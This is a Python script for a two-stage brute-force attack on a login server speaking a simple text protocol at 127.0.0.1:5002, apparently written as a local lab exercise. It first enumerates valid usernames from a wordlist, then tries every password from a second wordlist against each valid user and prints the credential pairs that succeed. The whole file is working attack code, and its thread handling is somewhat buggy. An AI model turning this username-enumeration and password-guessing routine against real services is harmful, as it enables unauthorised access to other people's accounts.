import socket
import threading
import time

from colors import Color


def try_connect():  # Main function
    a_socket = socket.socket()
    try:
        a_socket.connect(("127.0.0.1", 5002))  # Try to connect to the server
        a_socket.shutdown(socket.SHUT_RDWR)  # Disconnect from the server
        a_socket.close()
        print("*******************START of the brute force attack**************************")
        find_user(a_socket)
        time.sleep(5)
        find_pass(a_socket)
        print("*******************END of the brute force attack**************************")
    except:
        print("Server is not responding")
        exit()


def find_user(a_socket):  # Function to find an user that can login
    f = open("success_user.txt", "w")
    with open("user.txt", "r") as a_file:
        for line in a_file:
            client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            client.connect(('127.0.0.1', 5002))
            stop_thread = False
            user = line.strip()
            recieve_thread = threading.Thread(target=receive_user, args=[user, client, stop_thread])
            recieve_thread.start()
            a_socket.close()


def find_pass(a_socket):  # Function to find the password associated with a user
    with open("success_user.txt", "r") as user_file:
        for line_p in user_file:
            user = line_p.strip()
            with open("pass.txt", "r") as a_file:
                for line in a_file:
                    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    client.connect(('127.0.0.1', 5002))
                    stop_thread = False
                    passwd = line.strip()
                    recieve_thread = threading.Thread(target=receive_pass, args=[user, passwd, client, stop_thread])
                    recieve_thread.start()
                    a_socket.close()


def receive_user(user, client, stop_thread):  # Main loop to create a file with username that can login
    while True:
        if stop_thread:
            break
        msg = client.recv(1024).decode('utf-8')
        cmd = msg.split(" ")
        if cmd[0] == "ASK":
            if cmd[1] == "PSEUDO":
                cmd = "LOG PSEUDO " + user
                send_input(cmd, client)
            elif cmd[1] == "PASSWORD":
                with open('success_user.txt', 'a+') as f:
                    f.write(user + "\n")
        elif cmd[0] == "ERROR":
            if cmd[1] == "PSEUDO":
                exit()


def receive_pass(user, passwd, client, stop_thread):  # Main loop to send pseudo and password to find an association between the two
    while True:
        if stop_thread:
            break
        msg = client.recv(1024).decode('utf-8')
        cmd = msg.split(" ")
        if cmd[0] == "ASK":
            if cmd[1] == "PSEUDO":
                cmd = "LOG PSEUDO " + user
                send_input(cmd, client)
            elif cmd[1] == "PASSWORD":
                cmd = "LOG PASSWORD " + passwd
                send_input(cmd, client)
        elif cmd[0] == "ERROR":
            if cmd[1] == "PASSWORD":
                send_input(cmd, client)
        elif cmd[0] == "SUCCESS":
            print("*******SUCCESS**********")
            Color.success("It's a match ! : " + user + ":" + passwd)


def send_input(command, client):  # Send a command to the ftp server
    client.send(command.encode("utf-8"))


try_connect()  # Start the program
